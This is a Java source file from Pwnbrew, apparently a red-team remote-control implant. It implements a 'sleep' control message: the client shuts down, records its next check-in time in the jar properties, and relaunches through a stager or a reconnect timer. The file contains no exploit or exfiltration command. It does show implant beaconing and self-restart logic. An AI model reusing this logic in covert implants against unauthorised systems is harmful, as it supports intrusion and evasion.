/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


/*
* Sleep.java
*
* Created on June 7, 2013, 9:12:33 PM
*/

package pwnbrew.network.control.messages;

import java.io.File;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.text.ParseException;
import java.util.Calendar;
import java.util.Date;
import java.util.logging.Level;
import pwnbrew.ClientConfig;
import pwnbrew.log.RemoteLog;
import pwnbrew.manager.PortManager;
import pwnbrew.network.ClientPortRouter;
import pwnbrew.utilities.Constants;
import pwnbrew.utilities.LoaderUtilities;
import pwnbrew.utilities.Utilities;
import pwnbrew.network.ControlOption;
import pwnbrew.utilities.DebugPrinter;
import pwnbrew.utilities.ReconnectTimer;

/**
 *
 *  
 */
public final class Sleep extends ControlMessage {    
    
    private static final byte OPTION_SLEEP_TIME = 17; //IN SECONDS    
    private String sleepTime = "";
    
    //Class name
    private static final String NAME_Class = Sleep.class.getSimpleName();
    
    public static final short MESSAGE_ID = 0x4e;
 
    // ==========================================================================
    /**
     * Constructor
     *
     * @param passedId
    */
    public Sleep( byte[] passedId )  {
        super(passedId);
    }
    
     //=========================================================================
    /**
     *  Sets the variable in the message related to this TLV
     * 
     * @param tempTlv 
     * @return  
     */
    @Override
    public boolean setOption( ControlOption tempTlv ){    
        
        boolean retVal = true;
        try {
            byte[] theValue = tempTlv.getValue();
            switch( tempTlv.getType()){
                case OPTION_SLEEP_TIME:
                    sleepTime = new String( theValue, "US-ASCII");
                    break;
                default:
                    retVal = false;
                    break;
            } 
        } catch (UnsupportedEncodingException ex) {
            ex = null;
        }
        return retVal;
        
    }
    
    //===============================================================
    /**
     * Returns the number of seconds to sleep before trying to connect to the server.
     *
     * @return
     */
    public String getSleepTime() {
        return sleepTime;
    }
    
    //===============================================================
    /**
    *   Performs the logic specific to the message.
    *
     * @param passedManager
    */
    @Override
    public void evaluate( PortManager passedManager ) {
        
        //Pass it to the manager
        try {
                        
            //Get the sleep time and spin up a thread to connect after the time.
            String theSleepTime = getSleepTime();
            Date sleepDate = Constants.CHECKIN_DATE_FORMAT.parse( theSleepTime );

            //Add the difference to the sleep date
            Calendar aCalendar = Calendar.getInstance();
            aCalendar.setTime(sleepDate);
            
            Date adjSleepDate = aCalendar.getTime();
            String adjSleepDateStr = Constants.CHECKIN_DATE_FORMAT.format(adjSleepDate);
            DebugPrinter.printMessage(NAME_Class, "Sleeping until " + adjSleepDateStr);
            
            String dateStr = Long.toString( aCalendar.getTime().getTime() );
                   
            if( Utilities.isStaged()){
                
                Class stagerClass = Class.forName("stager.Stager");
                ClassLoader aClassLoader = stagerClass.getClassLoader();  
                
                File theClassPath = Utilities.getClassPath(); 
                String properties = Constants.PROP_FILE;
                String propLabel = Constants.SLEEP_LABEL;
                                
                try {
            
                    //Get the stager class
                    String svcStr = "";
                    Field aField = stagerClass.getField("serviceName");
                    Object anObj = aField.get(null);
                    if( anObj != null && anObj instanceof String ){
                        //Cast to string
                        svcStr = (String)anObj;
                    }

                    //Shutdown the client
                    passedManager.shutdown();
                    
                    //Unload the libraries
                    LoaderUtilities.unloadLibs( aClassLoader );
                    Utilities.updateJarProperties( theClassPath, properties, propLabel, dateStr );
                    LoaderUtilities.reloadLib(theClassPath);

                    //Call the stager main function
                    Method aMethod = stagerClass.getMethod( "main", new Class[]{ String[].class } );
                    aMethod.invoke(null, new Object[] { new String[]{ svcStr } });

                } catch (NoSuchMethodException | SecurityException | IllegalAccessException | IllegalArgumentException | InvocationTargetException | NoSuchFieldException ex) {
                    RemoteLog.log(Level.WARNING, NAME_Class, "evaluate()", ex.getMessage(), ex);    
                }
                
            } else {
                
                ClientConfig theConf = ClientConfig.getConfig();
                int socketPort = theConf.getSocketPort();
                int theChannelId = getChannelId();
        
                //Get the port router
                ClientPortRouter aPR = (ClientPortRouter) passedManager.getPortRouter( socketPort );
                ReconnectTimer aReconnectTimer = aPR.getConnectionManager().getReconnectTimer(theChannelId);

                //Create one if it doesn't exist
                if( aReconnectTimer == null)
                    aReconnectTimer = new ReconnectTimer(passedManager, theChannelId); 
                
                //Set the initial sleep date
                aReconnectTimer.setSleepDateStr(adjSleepDate);
                
            }             
            

        } catch (ParseException | ClassNotFoundException | IllegalArgumentException ex) {
            RemoteLog.log(Level.INFO, NAME_Class, "evaluate()", ex.getMessage(), ex );        
        }

    }

}/* END CLASS Sleep */
